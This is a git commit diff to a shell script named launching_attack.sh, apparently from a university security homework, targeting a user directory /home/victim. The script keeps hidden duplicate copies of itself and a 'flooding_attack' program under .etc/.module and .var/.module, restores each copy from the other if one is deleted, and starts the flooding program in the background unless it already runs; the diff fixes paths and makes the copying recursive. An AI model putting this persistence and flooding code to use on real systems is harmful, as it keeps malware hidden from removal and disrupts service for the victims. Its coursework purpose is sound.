cb702b3b904f8a968fcb2d4351a9a226fbe4b79d
YU-AN CHEN <yuanchen@cs.nctu.edu.tw>
2019-04-27 16:50:02 +0800

    Update launching_attack.sh

--- hw2/launching_attack.sh
+++ hw2/launching_attack.sh
@@ -2,19 +2,26 @@
 
 home_dir="/home/victim"
 launch_dir=".launch_attack"
-dir01=".etc/.module"
-dir02=".var/.module"
+dir01=".etc"
+dir02=".var"
+module_dir=".module"
 launch_file="launching_attack.sh"
 flooding_file="flooding_attack"
 
 check_and_restore() {
-  if [ ! -d "$home_dir/$dir01" ] || [ ! -f "$home_dir/$dir01/$launch_file" ] || [ ! -f "$home_dir/$dir01/$flooding_file" ]
+  if [ ! -d "$home_dir/$dir01" ] ||\
+    [ ! -d "$home_dir/$dir01/$module_dir" ] ||\
+    [ ! -f "$home_dir/$dir01/$module_dir/$launch_file" ] ||\
+    [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
   then
-    cp "$home_dir/$dir02" "$home_dir/$dir01"
+    cp -r "$home_dir/$dir02" "$home_dir/$dir01"
   fi
-  if [ ! -d "$home_dir/$dir02" ] || [ ! -f "$home_dir/$dir02/$launch_file" ] || [ ! -f "$home_dir/$dir02/$flooding_file" ]
+  if [ ! -d "$home_dir/$dir02" ] ||\
+    [ ! -d "$home_dir/$dir02/$module_dir" ] ||\
+    [ ! -f "$home_dir/$dir02/$module_dir/$launch_file" ] ||\
+    [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
   then
-    cp "$home_dir/$dir01" "$home_dir/$dir02"
+    cp -r "$home_dir/$dir01" "$home_dir/$dir02"
   fi
 }
 
@@ -28,7 +35,7 @@ payload() {
   if [ $? -eq 0 ]; then # positive match
     echo "Attack already launched!"
   else
-    $home_dir/$dir01/flooding_attack&
+    $home_dir/$dir01/$module_dir/flooding_attack&
   fi
 }
 
